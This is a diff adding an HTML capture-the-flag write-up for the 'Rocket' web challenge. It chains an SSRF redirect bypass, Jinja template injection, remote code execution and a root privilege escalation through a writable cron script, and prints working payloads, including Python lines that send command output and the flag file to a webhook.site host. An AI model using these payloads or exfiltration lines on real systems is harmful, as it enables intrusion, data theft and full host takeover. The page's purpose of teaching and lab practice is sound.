@@ -1,0 +1,214 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Full writeup for the Rocket web exploitation challenge.">
+  <title>Rocket Writeup // mitza</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+  <div class="bg-grid" aria-hidden="true"></div>
+  <div class="bg-glow" aria-hidden="true"></div>
+
+  <header class="site-header">
+    <div class="container nav-wrap">
+      <a class="brand" href="../index.html">mitza<span class="brand-pulse">.ctf</span></a>
+      <button class="menu-btn" id="menuBtn" aria-label="Toggle menu">Menu</button>
+      <nav class="site-nav" id="siteNav">
+        <a href="../index.html#writeups">Writeups</a>
+        <a href="https://app.cyber-edu.co/user/9b4bc336-58f0-422a-9a22-9b6f4694d2cb?tenant=cyberedu" target="_blank" rel="noopener noreferrer">Cyber-EDU</a>
+      </nav>
+    </div>
+  </header>
+
+  <main class="container article-wrap">
+    <article class="article-card reveal">
+      <a class="btn btn-ghost" href="../index.html">← Back to writeups</a>
+
+      <div class="article-meta">
+        <span>Challenge: Rocket</span>
+        <span>Category: Web Exploitation</span>
+        <span>Author: mitza (Tudor Mihai Alexandru)</span>
+      </div>
+
+      <h1>Rocket - full solve notes</h1>
+      <p class="article-lead">
+        Solved this on Cyber-EDU and wrote everything down while doing it. Chain was:
+        SSRF bypass → internal service pop → SSTI → RCE → root privesc.
+        Kept this page detailed so you can reproduce it end-to-end.
+      </p>
+
+      <p class="note">
+        Platform profile: <a href="https://app.cyber-edu.co/user/9b4bc336-58f0-422a-9a22-9b6f4694d2cb?tenant=cyberedu" target="_blank" rel="noopener noreferrer">Cyber-EDU user page</a>
+      </p>
+
+      <ol class="toc">
+        <li><a href="#challenge-info">Challenge Information</a></li>
+        <li><a href="#recon">Recon on Public Service</a></li>
+        <li><a href="#ssrf">SSRF Bypass to Reach Internal Blog</a></li>
+        <li><a href="#ssti">Internal Blog Exploitation (SSTI)</a></li>
+        <li><a href="#rce">From SSTI to Reliable RCE</a></li>
+        <li><a href="#privesc">Privilege Escalation to Root</a></li>
+        <li><a href="#flag">Flag Extraction</a></li>
+        <li><a href="#lessons">Security Lessons</a></li>
+      </ol>
+
+      <h2 id="challenge-info">1. Challenge Information</h2>
+      <p>
+        <strong>Title:</strong> Rocket<br>
+        <strong>Description hint:</strong> something obvious, likely in a screenshot-oriented flow.<br>
+        <strong>Public target:</strong> <code>http://34.40.48.76:31116</code>
+      </p>
+      <p>
+        The front page was a screenshot API: user gives a URL, app captures and returns an image preview.
+        This pattern is a common SSRF surface.
+      </p>
+
+      <h2 id="recon">2. Recon on Public Service</h2>
+      <p>Initial request:</p>
+      <pre><code class="language-bash">curl -i http://34.40.48.76:31116/</code></pre>
+      <p>
+        The returned HTML leaked two useful details:
+      </p>
+      <ul>
+        <li>A blog button points to <code>http://blog:4000</code> (internal hostname).</li>
+        <li>An HTML comment says blog vulnerabilities should be fixed before exposure.</li>
+      </ul>
+      <p>
+        That is a giant signal: compromise likely involves the internal blog service.
+      </p>
+
+      <h2 id="ssrf">3. SSRF Bypass to Reach Internal Blog</h2>
+      <p>
+        Direct input like <code>http://127.0.0.1:4000</code> or <code>http://blog:4000</code> was blocked by
+        the screenshot service with <code>Blocked: internal address</code>.
+      </p>
+      <p>
+        The bypass was to pass validation with an external URL that issues a redirect to internal target.
+        Example:
+      </p>
+      <pre><code class="language-bash">https://httpbin.org/redirect-to?url=http://127.0.0.1:4000</code></pre>
+      <p>
+        The app validated only the initial URL, then the headless browser followed redirect and loaded internal blog.
+      </p>
+      <p class="note">
+        SSRF filter weakness: checking only first-hop destination is insufficient when redirects are allowed.
+      </p>
+
+      <h2 id="ssti">4. Internal Blog Exploitation (SSTI)</h2>
+      <p>
+        Internal blog was a Flask app with one post and a comment box. Since we only had browser-based access via screenshots,
+        we used a hosted HTML page with JS auto-submit to issue POST requests into internal blog.
+      </p>
+
+      <pre><code class="language-html">&lt;script&gt;
+const f = document.createElement('form');
+f.method = 'POST';
+f.action = 'http://127.0.0.1:4000/';
+const i = document.createElement('input');
+i.name = 'comment';
+i.value = '{{7*7}}';
+f.appendChild(i);
+document.body.appendChild(f);
+f.submit();
+&lt;/script&gt;</code></pre>
+
+      <p>
+        Rendering later showed evaluated result <code>49</code>, confirming Server-Side Template Injection.
+      </p>
+      <p>
+        Exfiltrated source confirmed the vulnerable line:
+      </p>
+      <pre><code class="language-python"># vulnerable
+rendered = render_template_string(comment)
+comments.append(rendered)</code></pre>
+
+      <p>
+        And comments were output as safe HTML (<code>{{ c|safe }}</code>), enabling stored XSS side effects as well.
+      </p>
+
+      <h2 id="rce">5. From SSTI to Reliable RCE</h2>
+      <p>
+        Standard Flask/Jinja object chain worked:
+      </p>
+      <pre><code class="language-jinja2">{{ cycler.__init__.__globals__.os.popen("id").read() }}</code></pre>
+      <p>
+        For robust out-of-band exfiltration, we used Python inside target container and posted results to webhook:
+      </p>
+      <pre><code class="language-jinja2">{{ cycler.__init__.__globals__.os.popen(
+"python3 -c 'import urllib.request;urllib.request.urlopen(\"https://webhook.site/&lt;token&gt;\", data=b\"PING\")'"
+).read() }}</code></pre>
+      <p>
+        Callback confirmed code execution as user <code>blog</code>.
+      </p>
+
+      <h2 id="privesc">6. Privilege Escalation to Root</h2>
+      <p>
+        Recon from RCE showed:
+      </p>
+      <ul>
+        <li><code>/flag.txt</code> exists, owned by root, mode <code>600</code>.</li>
+        <li>Current user <code>blog</code> cannot read it directly.</li>
+        <li>Root cron runs every 10 minutes:</li>
+      </ul>
+      <pre><code class="language-cron">*/10 * * * * root /usr/sbin/logrotate -f /etc/logrotate.d/app</code></pre>
+      <p>
+        <code>/etc/logrotate.d/app</code> had a <code>postrotate</code> hook:
+      </p>
+      <pre><code class="language-conf">postrotate
+    /usr/local/bin/cleanup.sh
+endscript</code></pre>
+      <p>
+        Crucial misconfiguration: <code>/usr/local/bin/cleanup.sh</code> was writable by <code>blog</code>.
+      </p>
+      <pre><code class="language-bash">-rwxr-xr-x 1 blog blog 0 ... /usr/local/bin/cleanup.sh</code></pre>
+
+      <p>
+        So we replaced it with a root callback payload:
+      </p>
+      <pre><code class="language-sh">#!/bin/sh
+python3 - &lt;&lt;'PY'
+import urllib.request, subprocess
+out = subprocess.getoutput('id; cat /flag.txt 2>&1')
+urllib.request.urlopen('https://webhook.site/&lt;token&gt;', data=('CRON_FLAG\n'+out).encode())
+PY</code></pre>
+
+      <p>
+        After waiting for next cron window, webhook received:
+      </p>
+      <pre><code class="language-text">uid=0(root) gid=0(root) groups=0(root)
+ctf{REDACTED_FOR_PUBLIC_WRITEUP}</code></pre>
+
+      <h2 id="flag">7. Flag</h2>
+      <div class="flag-box">
+        <strong>Final flag:</strong><br>
+        <code>ctf{REDACTED_FOR_PUBLIC_WRITEUP}</code>
+      </div>
+
+      <h2 id="lessons">8. Security Lessons</h2>
+      <ol>
+        <li>SSRF protections must validate full redirect chain and final resolved destination.</li>
+        <li>Never render user input with <code>render_template_string</code>.</li>
+        <li>Never output user-controlled HTML with <code>|safe</code> unless absolutely trusted and sanitized.</li>
+        <li>Root cron + writable scripts is a direct privilege escalation vulnerability.</li>
+        <li>Defense-in-depth matters: one bug should not unlock full host compromise.</li>
+      </ol>
+
+      <p class="note">
+        Writeup by <strong>mitza</strong> (<strong>Tudor Mihai Alexandru</strong>).<br>
+        More challenges: <a href="https://app.cyber-edu.co/user/9b4bc336-58f0-422a-9a22-9b6f4694d2cb?tenant=cyberedu" target="_blank" rel="noopener noreferrer">Cyber-EDU profile</a>
+      </p>
+    </article>
+  </main>
+
+  <footer class="site-footer container">
+    <p>mitza.ctf • Practical offensive notes from solved challenges</p>
+  </footer>
+
+  <script src="../assets/app.js"></script>
+</body>
+</html>
